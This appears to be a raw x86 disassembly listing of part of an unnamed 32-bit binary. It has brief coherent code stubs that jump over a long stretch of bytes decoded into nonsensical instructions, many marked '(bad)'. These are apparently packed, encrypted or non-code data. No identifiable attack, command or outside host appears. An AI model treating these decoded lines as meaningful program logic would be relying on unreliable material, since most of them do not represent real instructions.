  40ed06:	mov    ecx,DWORD PTR [ebp+0x8]
  40ed09:	add    ecx,DWORD PTR [eax+0x20]
  40ed0c:	mov    DWORD PTR [ebp-0x28],ecx
  40ed0f:	mov    eax,DWORD PTR [ebp-0x14]
  40ed12:	mov    ecx,DWORD PTR [ebp+0x8]
  40ed15:	jmp    0x40f109
  40ed1a:	loopne 0x40ece4
  40ed1c:	or     ebx,DWORD PTR [edx]
  40ed1e:	xor    esp,ecx
  40ed20:	in     eax,dx
  40ed21:	ror    BYTE PTR [esi],cl
  40ed23:	cmp    DWORD PTR [ebx+0x12c01577],eax
  40ed29:	add    BYTE PTR [esi+eiz*4],0x70
  40ed2d:	jo     0x40ed78
  40ed2f:	jge    0x40eda1
  40ed31:	jo     0x40ed7f
  40ed33:	test   ebx,esi
  40ed35:	imul   esp,DWORD PTR [edi-0x26]
  40ed39:	sub    dh,BYTE PTR [ebx]
  40ed3b:	or     al,0xc8
  40ed3d:	jp     0x40ed10
  40ed3f:	xchg   edx,eax
  40ed40:	fcmovu st,st(2)
  40ed42:	sbb    BYTE PTR [edx-0x44],0xa8
  40ed46:	lds    ebx,FWORD PTR [eax-0x33]
  40ed49:	in     al,dx
  40ed4a:	mov    al,ds:0xbe0fbaa
  40ed4f:	(bad)  [ebx]
  40ed51:	mov    esi,eax
  40ed53:	rol    DWORD PTR [edi-0x5e],1
  40ed56:	into   
  40ed57:	push   edx
  40ed58:	rcl    DWORD PTR ss:[ebx-0x4a],1
  40ed5c:	or     DWORD PTR [ecx-0x2f],0x8e146b12
  40ed63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed64:	and    cl,bh
  40ed66:	daa    
  40ed67:	cmp    ebx,DWORD PTR [ebp+0x66]
  40ed6a:	cmp    BYTE PTR [ecx+0x8],dh
  40ed6d:	test   al,0x94
  40ed6f:	(bad)  
  40ed70:	call   0x44ea:0x366d4cbd
  40ed77:	mov    al,0xdb
  40ed79:	dec    esp
  40ed7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed7b:	gs out 0xe8,al
  40ed7e:	aas    
  40ed7f:	jo     0x40ed1b
  40ed81:	shr    DWORD PTR [eax+0x1add3080],1
  40ed87:	pop    esp
  40ed88:	popf   
  40ed89:	sbb    ecx,DWORD PTR [esi-0x5a97364f]
  40ed8f:	jecxz  0x40edce
  40ed91:	jmp    0xb0ef010f
  40ed96:	adc    al,0x71
  40ed98:	imul   eax,DWORD PTR [ebx],0xaa78f03
  40ed9e:	aam    0xb5
  40eda0:	stos   BYTE PTR es:[edi],al
  40eda1:	mov    bl,0x68
  40eda3:	adc    DWORD PTR [esi-0x6f27f312],0x17
  40edaa:	test   BYTE PTR [ebx],0x70
  40edad:	cmp    al,0xb8
  40edaf:	dec    esi
  40edb0:	sti    
  40edb1:	fist   DWORD PTR [ebx-0x3dea7c2e]
  40edb7:	add    WORD PTR [edi],bx
  40edba:	jo     0x40edb4
  40edbc:	int    0x32
  40edbe:	jmp    0x6718:0x7f0094b8
  40edc5:	ins    DWORD PTR es:[edi],dx
  40edc6:	(bad)  
  40edc7:	pusha  
  40edc8:	sti    
  40edc9:	push   cs
  40edca:	je     0x40ee11
  40edcc:	(bad)  
  40edce:	dec    eax
  40edcf:	test   DWORD PTR [ecx+0x4b],ecx
  40edd2:	mov    ds:0xe85284a7,eax
  40edd7:	jo     0x40ee3c
  40edd9:	clc    
  40edda:	mov    ?,WORD PTR [ecx+0x6]
  40eddd:	mov    edx,0x6359bf7f
  40ede2:	mov    ah,0xd3
  40ede4:	sbb    DWORD PTR [edx],esp
  40ede6:	jne    0x40edc7
  40ede8:	loopne 0x40ed88
  40edea:	xor    esp,DWORD PTR [ebx+0x19]
  40eded:	mov    edx,0x1d0810c1
  40edf2:	and    esi,DWORD PTR [edx]
  40edf4:	lea    edi,[edi]
  40edf6:	rcr    edi,cl
  40edf8:	xchg   edi,eax
  40edf9:	jmp    DWORD PTR cs:[ebx+0x1f778e9e]
  40ee00:	sub    bh,al
  40ee02:	mov    al,0x23
  40ee04:	jmp    0xe608:0xd9602860
  40ee0b:	cmp    al,ch
  40ee0d:	js     0x40ee0a
  40ee0f:	adc    DWORD PTR ds:0xeaaf6f59,eax
  40ee15:	lods   al,BYTE PTR ds:[esi]
  40ee16:	pop    esi
  40ee17:	adc    esp,esp
  40ee19:	mov    ch,0x8b
  40ee1b:	add    al,0x2d
  40ee1d:	jle    0x40eda5
  40ee1f:	retf   0x13da
  40ee22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ee24:	gs jp  0x40ee12
  40ee27:	inc    esp
  40ee28:	lock (bad) 
  40ee2a:	mov    esi,0xb1ff15d6
  40ee2f:	and    al,0xd6
  40ee31:	sub    DWORD PTR [ebx-0x75],ebp
  40ee34:	retf   0x4c5d
  40ee37:	test   al,0x1d
  40ee39:	jmp    0x25365d7d
  40ee3e:	push   ecx
  40ee3f:	inc    ebp
  40ee40:	lock out dx,al
  40ee42:	lods   eax,DWORD PTR ds:[esi]
  40ee43:	add    ebx,DWORD PTR [ecx+0x4c]
  40ee46:	cmp    al,0xdf
  40ee48:	mov    edx,0x44d1342c
  40ee4d:	xchg   edi,eax
  40ee4e:	mov    esp,0x19ed1b08
  40ee53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee54:	std    
  40ee55:	jmp    0x40edde
  40ee57:	pop    es
  40ee58:	push   es
  40ee59:	fild   QWORD PTR [eax]
  40ee5b:	lea    edx,[ebx]
  40ee5d:	push   0x486a9ba9
  40ee62:	ja     0x40eebb
  40ee64:	repz scas eax,DWORD PTR es:[edi]
  40ee66:	popf   
  40ee67:	sub    al,0x3e
  40ee69:	(bad)  [ebx]
  40ee6b:	cwde   
  40ee6c:	(bad)  
  40ee6d:	out    0x5c,al
  40ee6f:	sub    eax,0x1467ee53
  40ee74:	pop    edi
  40ee75:	sti    
  40ee76:	pusha  
  40ee77:	xor    edi,ebx
  40ee79:	dec    esi
  40ee7a:	sar    BYTE PTR [ecx],0x29
  40ee7d:	test   DWORD PTR [esi+0x17d8e2af],0xb2a6b1cf
  40ee87:	je     0x40eea6
  40ee89:	sub    ah,ah
  40ee8b:	mov    dl,BYTE PTR [ebx-0x6e]
  40ee8e:	xchg   ebp,eax
  40ee8f:	dec    esp
  40ee90:	sub    edi,DWORD PTR [edi-0x53]
  40ee93:	sar    BYTE PTR [ecx+0x33],0xb0
  40ee97:	gs jbe 0x40eef1
  40ee9a:	jbe    0x40eec2
  40ee9c:	jecxz  0x40eeff
  40ee9e:	loopne 0x40eed5
  40eea0:	test   eax,0x67e0b6de
  40eea5:	mov    DWORD PTR [ebx],esp
  40eea7:	imul   ebx,DWORD PTR [ebp-0x413950bd],0xf4c97ae7
  40eeb1:	cmp    al,0x8b
  40eeb3:	mov    bl,bh
  40eeb5:	stc    
  40eeb6:	mov    esi,0xf48543f3
  40eebb:	scas   al,BYTE PTR es:[edi]
  40eebc:	stos   BYTE PTR es:[edi],al
  40eebd:	xchg   DWORD PTR [ecx],ebp
  40eebf:	test   DWORD PTR [esi],ebp
  40eec1:	sub    BYTE PTR [edi],ah
  40eec3:	out    dx,al
  40eec4:	lods   al,BYTE PTR ds:[esi]
  40eec5:	pop    esi
  40eec6:	pop    ecx
  40eec7:	out    0xa1,eax
  40eec9:	adc    eax,0x6eca4bfb
  40eece:	xchg   edi,eax
  40eecf:	out    dx,al
  40eed0:	jae    0x40ef44
  40eed2:	lods   al,BYTE PTR ds:[esi]
  40eed3:	or     bh,BYTE PTR [ecx+ebx*8-0xf]
  40eed7:	push   0x1c6508ff
  40eedc:	imul   ebp,esp,0xf34e2bfb
  40eee2:	mov    ch,0x5a
  40eee4:	(bad)  
  40eee5:	cwde   
  40eee6:	aaa    
  40eee7:	fsub   QWORD PTR [esi]
  40eee9:	cmp    DWORD PTR [eax+eiz*2-0x13011d52],esp
  40eef0:	loop   0x40eeb6
  40eef2:	call   0x9ff25b14
  40eef7:	je     0x40eecb
  40eef9:	xor    al,0xb7
  40eefb:	add    BYTE PTR [ebp-0x5804012c],cl
  40ef01:	mov    ebx,0x79383bdb
  40ef06:	xor    DWORD PTR [edi+0x33437fa4],edx
  40ef0c:	mov    WORD PTR [edx],cs
  40ef0e:	sbb    DWORD PTR [edx],edi
  40ef10:	inc    esp
  40ef11:	stos   DWORD PTR es:[edi],eax
  40ef12:	test   dh,0xdf
  40ef15:	adc    ch,dh
  40ef17:	adc    DWORD PTR [edx-0x4],eax
  40ef1a:	jle    0x40eec0
  40ef1c:	pop    es
  40ef1d:	inc    edx
  40ef1e:	and    BYTE PTR [edi+0x402d8a24],cl
  40ef24:	(bad)  
  40ef25:	in     eax,dx
  40ef26:	sub    al,0x91
  40ef28:	les    edi,FWORD PTR [edx]
  40ef2a:	sbb    al,0x1a
  40ef2c:	cmc    
  40ef2d:	mov    cl,al
  40ef2f:	cmp    BYTE PTR [ebx-0xe],dh
  40ef32:	sub    ecx,DWORD PTR [esi]
  40ef34:	cdq    
  40ef35:	iret   
  40ef36:	inc    ebx
  40ef37:	out    0xa5,al
  40ef39:	or     edi,edx
  40ef3b:	push   edx
  40ef3c:	lods   al,BYTE PTR ds:[esi]
  40ef3d:	xor    BYTE PTR [edi-0x76f19b8b],al
  40ef43:	add    BYTE PTR ds:0xa40fb76e,ah
  40ef49:	outs   dx,DWORD PTR ds:[esi]
  40ef4a:	hlt    
  40ef4b:	inc    esi
  40ef4c:	jp     0x40eedf
  40ef4e:	and    al,0xfb
  40ef50:	push   es
  40ef51:	mov    esi,0x5bb55d80
  40ef56:	pop    eax
  40ef57:	cmpxchg BYTE PTR [edi-0x5d],ch
  40ef5b:	xchg   esi,eax
  40ef5c:	and    ebp,DWORD PTR [ecx+0x57]
  40ef5f:	fisttp DWORD PTR [esi]
  40ef61:	dec    esp
  40ef62:	inc    ebx
  40ef63:	les    eax,FWORD PTR [ecx-0x60715c81]
  40ef69:	jge    0x40ef80
  40ef6b:	idiv   BYTE PTR [edx+0x727d8187]
  40ef71:	stos   DWORD PTR es:[edi],eax
  40ef72:	sub    eax,0xaf2dc4d7
  40ef77:	xchg   bh,dh
  40ef79:	xchg   esi,eax
  40ef7a:	xor    edx,DWORD PTR [ebx-0x5f]
  40ef7d:	jne    0x40ef1e
  40ef7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef80:	jmp    0x40efdd
  40ef82:	mov    esi,0xe189f286
  40ef87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef88:	push   0x78
  40ef8a:	sbb    esi,DWORD PTR [esi]
  40ef8c:	xor    DWORD PTR [ebp-0x32],esi
  40ef8f:	fisub  DWORD PTR [edx+0x51]
  40ef92:	stos   DWORD PTR es:[edi],eax
  40ef93:	cs xor dl,0x61
  40ef97:	jg     0x40ef70
  40ef99:	iret   
  40ef9a:	outs   dx,DWORD PTR ds:[esi]
  40ef9b:	paddq  mm0,QWORD PTR [ebx+0xc]
  40ef9f:	lea    ebp,[ebx+0x4d0db13d]
  40efa5:	xchg   esi,eax
  40efa6:	(bad)  
  40efa7:	jbe    0x40ef67
  40efa9:	mov    WORD PTR [ecx],?
  40efab:	aam    0x39
  40efad:	je     0x40ef55
  40efaf:	stos   BYTE PTR es:[edi],al
  40efb0:	adc    al,0xb2
  40efb2:	jae    0x40ef52
  40efb4:	xor    bh,BYTE PTR [edi+0x76]
  40efb7:	scas   al,BYTE PTR es:[edi]
  40efb8:	and    eax,0x23a41
  40efbd:	fdiv   QWORD PTR [esp+eax*4+0x364b6203]
  40efc4:	dec    ecx
  40efc5:	mov    WORD PTR [edi-0x5f],ss
  40efc8:	mov    edi,0xd10faca5
  40efcd:	jns    0x40efcb
  40efcf:	or     cl,dl
  40efd1:	dec    esi
  40efd2:	mov    ebp,0xa5023588
  40efd7:	pop    edx
  40efd8:	mov    esp,0xbdafcb75
  40efdd:	ffreep st(6)
  40efdf:	(bad)  
  40efe0:	jp     0x40efb1
  40efe2:	imul   ebx,DWORD PTR [ebx],0xa0bacab6
  40efe8:	xor    ah,bh
  40efea:	add    edi,DWORD PTR [edx]
  40efec:	sbb    eax,0x1531abc6
  40eff1:	jle    0x40efee
  40eff3:	es lahf 
  40eff5:	shl    DWORD PTR [ecx+eiz*1-0x31],cl
  40eff9:	out    0x12,eax
  40effb:	popf   
  40effc:	test   DWORD PTR [ebx],edx
  40effe:	lds    edi,FWORD PTR cs:[esi]
  40f001:	es in  al,0x95
  40f004:	rcl    eax,0x5
  40f007:	add    ebx,edi
  40f009:	out    0xb8,eax
  40f00b:	adc    bh,ah
  40f00d:	retf   
  40f00e:	or     ebx,ebp
  40f010:	or     ebp,DWORD PTR [edi+0x6b786137]
  40f016:	sbb    bh,dh
  40f018:	or     dh,dl
  40f01a:	loopne 0x40eff5
  40f01c:	mov    dh,BYTE PTR [ebx]
  40f01e:	fucomp st(5)
  40f020:	add    edx,DWORD PTR [edi]
  40f022:	pop    ecx
  40f023:	std    
  40f024:	fs ret 0xb2d0
  40f028:	neg    BYTE PTR [esi]
  40f02a:	loop   0x40f028
  40f02c:	das    
  40f02d:	das    
  40f02e:	cwde   
  40f02f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f030:	adc    eax,0x364633fc
  40f035:	jo     0x40f03d
  40f037:	sub    DWORD PTR [edi+0x1],edx
  40f03a:	sbb    BYTE PTR [edi-0x6f],ch
  40f03d:	mov    dh,0xbb
  40f03f:	imul   edi,DWORD PTR ds:0x3af8651f,0xffffffed
  40f046:	adc    eax,0x9599355a
  40f04b:	test   BYTE PTR ds:0xf0ab9932,dh
  40f051:	sbb    al,0x48
  40f053:	or     al,0x11
  40f055:	call   0x9dfd:0xa8dfc1e1
  40f05c:	aad    0xc3
  40f05e:	jp     0x40f01d
  40f060:	fwait
  40f061:	test   ebp,eax
  40f063:	pop    ds
  40f064:	mov    ds:0x327f12de,al
  40f069:	jle    0x40f0e4
  40f06b:	jl     0x40f0b7
  40f06d:	add    BYTE PTR [ecx-0x53c65e4c],bl
  40f073:	stos   BYTE PTR es:[edi],al
  40f074:	dec    esi
  40f075:	mov    cl,0xbc
  40f077:	add    al,0x2f
  40f079:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f07a:	popa   
  40f07b:	in     al,dx
  40f07c:	cmp    edi,DWORD PTR [esp+edi*2]
  40f07f:	inc    ecx
  40f080:	adc    DWORD PTR [eax+0x8],eax
  40f083:	test   DWORD PTR [esi],0x18be4b08
  40f089:	jo     0x40f07c
  40f08b:	add    eax,0x97de8f2d
  40f090:	test   al,0xbb
  40f092:	sbb    bh,BYTE PTR [esi-0x5a]
  40f095:	(bad)  
  40f096:	mov    ds:0xcb19d324,al
  40f09b:	rcl    dl,cl
  40f09d:	loope  0x40f0eb
  40f09f:	nop
  40f0a0:	les    ebx,FWORD PTR [ebp-0x1c]
  40f0a3:	xor    eax,0xc66add2e
  40f0a8:	cli    
  40f0a9:	out    0x26,al
  40f0ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f0ac:	xchg   esi,eax
  40f0ad:	lods   eax,DWORD PTR ds:[esi]
  40f0ae:	bound  esi,QWORD PTR [esp+ebp*4-0x11]
  40f0b2:	fdiv   DWORD PTR [ecx-0x3200f64b]
  40f0b8:	imul   esp,eax,0xea8b6d4c
  40f0be:	(bad)  
  40f0bf:	mov    bh,0x1e
  40f0c1:	xchg   ebp,eax
  40f0c2:	push   es
  40f0c3:	popa   
  40f0c4:	inc    ebp
  40f0c5:	cmp    DWORD PTR [esp+eiz*4],ecx
  40f0c8:	push   esi
  40f0c9:	loop   0x40f0f8
  40f0cb:	call   0x3b0415f
  40f0d0:	sbb    eax,0x8e686115
  40f0d5:	loop   0x40f147
  40f0d7:	xchg   edx,eax
  40f0d8:	scas   eax,DWORD PTR es:[edi]
  40f0d9:	aas    
  40f0da:	addr16 xchg ecx,eax
  40f0dc:	mov    bl,0x17
  40f0de:	and    BYTE PTR [ebp+ecx*4-0x38f93ed8],bh
  40f0e5:	jb     0x40f11b
  40f0e7:	es jecxz 0x40f0a3
  40f0ea:	sahf   
  40f0eb:	mov    ss:0x1bdbfe94,eax
  40f0f1:	cs stc 
  40f0f3:	xchg   BYTE PTR [eax],ch
  40f0f5:	arpl   WORD PTR [ebp+0x46],bx
  40f0f8:	cdq    
  40f0f9:	adc    DWORD PTR [edi+esi*2+0x69],ebx
  40f0fd:	ficomp WORD PTR [ebx+0x53a2242]
  40f103:	add    BYTE PTR [eax+0x52],dl
  40f106:	fdiv   st,st(6)
  40f108:	xor    BYTE PTR [ebx],al
  40f10a:	dec    eax
  40f10b:	and    al,0x89
  40f10d:	dec    ebp
  40f10e:	aam    0x8b
  40f110:	inc    ebp
  40f111:	in     al,dx
  40f112:	mov    ecx,DWORD PTR [ebp+0x8]
  40f115:	add    ecx,DWORD PTR [eax+0x1c]
  40f118:	jmp    0x40f50c
  40f11d:	inc    ecx
  40f11e:	jae    0x40f19a
  40f120:	pop    ebp
  40f121:	sub    dh,BYTE PTR [ebp+0x61]
  40f124:	jae    0x40f173
  40f126:	and    ebp,DWORD PTR [eax]
  40f128:	mov    bh,0xd3
  40f12a:	aas    
  40f12b:	or     BYTE PTR [edx+0x7070a35d],ch
  40f131:	dec    ecx
  40f132:	jge    0x40f1a4
  40f134:	jo     0x40f13b
  40f136:	sub    BYTE PTR [esi],bh
  40f138:	gs mov dh,0x7c
  40f13b:	cli    
  40f13c:	xchg   esi,eax
  40f13d:	xchg   edx,eax
  40f13e:	mov    al,ah
  40f140:	ffree  st(1)
  40f142:	pusha  
  40f143:	cs test al,0xe1
  40f146:	adc    DWORD PTR [esi-0x19],esi
  40f149:	cdq    
  40f14a:	jbe    0x40f155
  40f14c:	cmp    al,0xbb
  40f14e:	dec    ebp
  40f14f:	pop    esi
  40f150:	mov    ah,0xf4
  40f152:	sbb    al,0x85
  40f154:	popf   
  40f155:	xor    BYTE PTR [esi],0xf0
  40f158:	cmp    ah,cl
  40f15a:	jno    0x40f10c
  40f15c:	in     eax,dx
  40f15d:	fnsave [eax+0x12008d06]
  40f163:	js     0x40f18b
  40f165:	not    DWORD PTR [esp+eax*1]
  40f168:	xor    cl,ah
  40f16a:	or     dh,bh
  40f16c:	ins    BYTE PTR es:[edi],dx
  40f16d:	pop    es
  40f16e:	retf   0x63e3
  40f171:	xchg   ebp,eax
  40f172:	ins    BYTE PTR es:[edi],dx
  40f173:	fld    DWORD PTR [ebx]
  40f175:	das    
  40f176:	xchg   edi,eax
  40f177:	jge    0x40f166
  40f179:	xor    eax,0x2488a5bc
  40f17e:	pop    eax
  40f17f:	jb     0x40f1b5
  40f181:	int    0x62
  40f183:	adc    al,0xdf
  40f185:	sbb    edi,DWORD PTR [edi-0x109b5aa5]
  40f18b:	jge    0x40f169
  40f18d:	push   ss
  40f18e:	outs   dx,BYTE PTR ds:[esi]
  40f18f:	cmp    DWORD PTR [edi+0x2a],edi
  40f192:	call   esi
  40f194:	js     0x40f181
  40f196:	lods   al,BYTE PTR ds:[esi]
  40f197:	jne    0x40f1d1
  40f199:	jp     0x40f210
  40f19b:	out    0xde,eax
  40f19d:	xchg   ebp,eax
  40f19e:	cmp    dl,BYTE PTR [ebp-0x74]
  40f1a1:	rol    BYTE PTR [esi+0x396eb173],cl
  40f1a7:	ds sub eax,0xc455940a
  40f1ad:	lods   al,BYTE PTR ds:[esi]
  40f1ae:	mov    ch,0x35
  40f1b0:	add    eax,0xb1e9dab3
  40f1b5:	in     eax,dx
  40f1b6:	push   ebx
  40f1b7:	cmp    bh,BYTE PTR [eax-0x27ea3160]
  40f1bd:	fbld   TBYTE PTR ds:0x4dc6e877
  40f1c3:	jb     0x40f17d
  40f1c5:	ins    BYTE PTR es:[edi],dx
  40f1c6:	idiv   BYTE PTR [ebp+0x15]
  40f1c9:	add    ch,BYTE PTR [edx]
  40f1cb:	ja     0x40f1b2
  40f1cd:	sbb    DWORD PTR [ebp+0x16c51520],ecx
  40f1d3:	clc    
  40f1d4:	in     eax,dx
  40f1d5:	and    ch,BYTE PTR [ebx-0x15]
  40f1d8:	loope  0x40f20a
  40f1da:	lock dec edi
  40f1dc:	mov    WORD PTR [ecx],ds
  40f1de:	adc    ah,bh
  40f1e0:	stos   BYTE PTR es:[edi],al
  40f1e1:	sti    
  40f1e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f1e3:	push   cs
  40f1e4:	add    esi,DWORD PTR [eax]
  40f1e6:	mov    ecx,0xaea62d04
  40f1eb:	mov    edx,esi
  40f1ed:	inc    eax
  40f1ee:	add    al,ch
  40f1f0:	retf   
  40f1f1:	xchg   ebx,eax
  40f1f2:	inc    edx
  40f1f3:	cli    
  40f1f4:	dec    esp
  40f1f5:	out    0xd2,eax
  40f1f7:	fwait
  40f1f8:	nop
  40f1f9:	mov    ds:0x5119ae13,eax
  40f1fe:	hlt    
  40f1ff:	icebp  
  40f200:	or     ch,BYTE PTR [esi]
  40f202:	pop    ebx
  40f203:	dec    eax
  40f204:	imul   ebx,DWORD PTR [ebx],0x76e685b9
  40f20a:	mov    ebx,0x7e9820e1
  40f20f:	fst    DWORD PTR [esi]
  40f211:	imul   esi,DWORD PTR [eax-0x123301a9],0x93ec31d0
  40f21b:	int3   
  40f21c:	imul   edi,DWORD PTR [ecx-0x57],0xaf800933
  40f223:	push   esp
  40f224:	out    0x1f,al
  40f226:	fwait
  40f227:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f228:	inc    ebp
  40f229:	add    dh,BYTE PTR [ecx+0x39dbb280]
  40f22f:	ror    DWORD PTR [edx-0x42],0x71
  40f233:	mov    cl,0x9b
  40f235:	repnz xchg ebx,eax
  40f237:	jno    0x40f25f
  40f239:	(bad)  
  40f23a:	dec    edi
  40f23b:	addr16 iret 
  40f23d:	jle    0x40f216
  40f23f:	fisttp DWORD PTR gs:[ebx-0x6c66e2a]
  40f246:	push   0x76a25da2
  40f24b:	pusha  
  40f24c:	pop    ecx
  40f24d:	xor    al,0xe7
  40f24f:	jg     0x40f258
  40f251:	fs in  eax,dx
  40f253:	ja     0x40f2c6
  40f255:	dec    edi
  40f256:	test   eax,0x8ee75f76
  40f25b:	sbb    ah,bh
  40f25d:	outs   dx,DWORD PTR ds:[esi]
  40f25e:	push   0x89e4ef9c
  40f263:	popf   
  40f264:	and    BYTE PTR [ecx+0x158bf009],0x8a
  40f26b:	pop    ss
  40f26c:	test   DWORD PTR [edi-0x43],esi
  40f26f:	sbb    DWORD PTR [edx+0x48],ebx
  40f272:	pop    eax
  40f273:	pop    ecx
  40f274:	mov    bl,0xce
  40f276:	ss adc al,0xb8
  40f279:	fimul  DWORD PTR [edx+ecx*8-0x1f0a9f85]
  40f280:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f281:	(bad)  
  40f282:	push   esi
  40f283:	pop    ebx
  40f284:	push   0xa4dbbc67
  40f289:	or     BYTE PTR [edi-0x2],ch
  40f28c:	pop    ebx
  40f28d:	loop   0x40f2a6
  40f28f:	adc    al,0xe0
  40f291:	xor    ecx,DWORD PTR [edi+0x383c5c75]
  40f297:	dec    dh
  40f299:	pop    edx
  40f29a:	push   ds
  40f29b:	(bad)  
  40f29c:	mov    ?,ecx
  40f29e:	mov    dl,0x74
  40f2a0:	outs   dx,DWORD PTR ds:[esi]
  40f2a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f2a2:	mov    ds:0x626a64bc,eax
  40f2a7:	xchg   ecx,eax
  40f2a8:	scas   al,BYTE PTR es:[edi]
  40f2a9:	add    al,0x77
  40f2ab:	rcl    DWORD PTR [edx],cl
  40f2ad:	dec    eax
  40f2ae:	lock or DWORD PTR [ebp-0x11],esi
  40f2b2:	arpl   di,dx
  40f2b4:	sub    al,0xde
  40f2b6:	add    DWORD PTR [ecx+edi*8+0x2b],edx
  40f2ba:	(bad)  
  40f2bb:	xchg   DWORD PTR [ebp-0x7e1c962e],edx
  40f2c1:	dec    ecx
  40f2c2:	and    al,0x7d
  40f2c4:	mov    ecx,0x26c2cd84
  40f2c9:	iret   
  40f2ca:	dec    edx
  40f2cb:	inc    ebx
  40f2cc:	retf   0x9876
  40f2cf:	test   eax,0x8369796d
  40f2d4:	inc    esp
  40f2d5:	jae    0x40f2b9
  40f2d7:	stos   BYTE PTR es:[edi],al
  40f2d8:	and    DWORD PTR [ebp+0x5caddaa2],esp
  40f2de:	inc    esp
  40f2df:	fnstenv ss:[ecx-0x4e]
  40f2e3:	add    eax,0x7b37278a
  40f2e8:	jmp    0xb7db28e1
  40f2ed:	mov    edi,0x86067a57
  40f2f2:	mov    bl,0x1d
  40f2f4:	push   edx
  40f2f5:	mov    dh,0x7d
  40f2f7:	mov    edi,0x4da63400
  40f2fc:	cmp    eax,0x48e1c750
  40f301:	sbb    esi,edi
  40f303:	mov    ebp,0xb668a7f9
  40f308:	dec    ecx
  40f309:	xchg   ecx,eax
  40f30a:	jno    0x40f330
  40f30c:	cld    
  40f30d:	jge    0x40f2d3
  40f30f:	dec    ebx
  40f310:	imul   esp,DWORD PTR [ebx+0x4d],0x91d5483
  40f317:	rcl    BYTE PTR [ecx-0x17],cl
  40f31a:	pushf  
  40f31b:	cmc    
  40f31c:	pop    ebp
  40f31d:	jae    0x40f2e7
  40f31f:	sar    BYTE PTR [ebx-0x62],1
  40f322:	or     DWORD PTR [esp+ecx*8],esp
  40f325:	xchg   esp,eax
  40f326:	mov    ebx,0x7ec2bf37
  40f32b:	mov    al,ds:0x891ebb33
  40f330:	popf   
  40f331:	sub    al,0x4d
  40f333:	cwde   
  40f334:	call   0x743d97f8
  40f339:	int    0x62
  40f33b:	fst    QWORD PTR [ebp+esi*8-0x26ff071c]
  40f342:	not    DWORD PTR [ecx]
  40f344:	ins    BYTE PTR es:[edi],dx
  40f345:	lods   eax,DWORD PTR ds:[esi]
  40f346:	inc    esp
  40f347:	popa   
  40f348:	call   0x970df840
  40f34d:	push   0xffffff8a
  40f34f:	pop    ecx
  40f350:	sub    cl,bh
  40f352:	add    eax,DWORD PTR [edx-0x621becc3]
  40f358:	add    DWORD PTR [eax],edx
  40f35a:	les    edx,FWORD PTR [edx+0x26]
  40f35d:	loopne 0x40f2f9
  40f35f:	add    DWORD PTR [ecx-0x1e],esi
  40f362:	push   DWORD PTR [edi-0x18]
  40f365:	lahf   
  40f366:	imul   ebp,ecx,0x34d37d08
  40f36c:	addr16 loopne 0x40f38e
  40f36f:	xchg   ebp,eax
  40f370:	and    BYTE PTR [esi+esi*8-0x3f89f9d0],dl
  40f377:	mov    esi,edx
  40f379:	ja     0x40f391
  40f37b:	aas    
  40f37c:	loope  0x40f32c
  40f37e:	test   eax,0x5bbe2f3f
  40f383:	push   ds
  40f384:	fmul   DWORD PTR [edi+0x59]
  40f387:	jnp    0x40f35d
  40f389:	add    esi,eax
  40f38b:	push   edx
  40f38c:	lea    esi,[edi]
  40f38e:	inc    esp
  40f38f:	mov    eax,DWORD PTR [eax]
  40f391:	mov    ebp,0x3d5b651
  40f396:	lods   al,BYTE PTR ds:[esi]
  40f397:	addr16 cwde 
  40f399:	push   esp
  40f39a:	sbb    eax,0x8ba7606a
  40f39f:	mov    WORD PTR [eax-0x42f11ab9],ss
  40f3a5:	inc    edx
  40f3a6:	sub    bl,bl
  40f3a8:	sahf   
  40f3a9:	adc    DWORD PTR [ebx-0x6e],edi
  40f3ac:	xchg   edi,eax
  40f3ad:	xchg   BYTE PTR [eax+0x3f15c756],dh
  40f3b3:	sbb    BYTE PTR [esi+0x1b1d5c9d],cl
  40f3b9:	jle    0x40f33e
  40f3bb:	ss cmp eax,0x7275cc43
  40f3c1:	popa   
  40f3c2:	cmp    eax,DWORD PTR [ebx+0x654c9260]
  40f3c8:	gs (bad) 
  40f3ca:	sub    bh,BYTE PTR [eax]
  40f3cc:	and    al,0x63
  40f3ce:	outs   dx,DWORD PTR ds:[esi]
  40f3cf:	stos   DWORD PTR es:[edi],eax
  40f3d0:	cmp    ebp,ecx
  40f3d2:	test   BYTE PTR [esi-0x40946043],dl
  40f3d8:	jnp    0x40f43b
  40f3da:	pusha  
  40f3db:	push   esp
  40f3dc:	inc    ecx
  40f3dd:	dec    esp
  40f3de:	mov    DWORD PTR [ebp+0x309947c5],ebx
  40f3e4:	and    al,0xa7
  40f3e6:	mov    ecx,0x793ac8c3
  40f3eb:	iret   
  40f3ec:	adc    eax,0x92f91cd
  40f3f1:	dec    edx
  40f3f2:	add    ecx,DWORD PTR ds:0x29f86ce1
  40f3f8:	leave  
  40f3f9:	cld    
  40f3fa:	test   eax,0xbf1c4cbf
  40f3ff:	jnp    0x40f451
  40f401:	test   DWORD PTR [edi-0x7],esi
  40f404:	dec    edi
  40f405:	mov    edx,0xcd7c55fe
  40f40a:	sub    al,BYTE PTR [edi+0x6bf21bfc]
  40f410:	adc    bh,bl
  40f412:	jno    0x40f399
  40f414:	mov    cl,0x32
  40f416:	addr16 bswap esi
  40f419:	and    DWORD PTR [edi+ebp*8],ecx
  40f41c:	rol    esp,cl
  40f41e:	and    bl,BYTE PTR [ebp-0x46912e6]
  40f424:	and    BYTE PTR [edx+0x4e161601],bh
  40f42a:	or     BYTE PTR [edx+0x66be4de9],bl
  40f430:	pop    ss
  40f431:	(bad)  
  40f432:	push   edx
  40f433:	mov    ah,0x2a
  40f436:	js     0x40f418
  40f438:	in     eax,0x90
  40f43a:	push   edx
  40f43b:	sahf   
  40f43c:	xchg   ecx,eax
  40f43d:	loope  0x40f4a7
  40f43f:	mov    dh,0x30
  40f441:	(bad)  
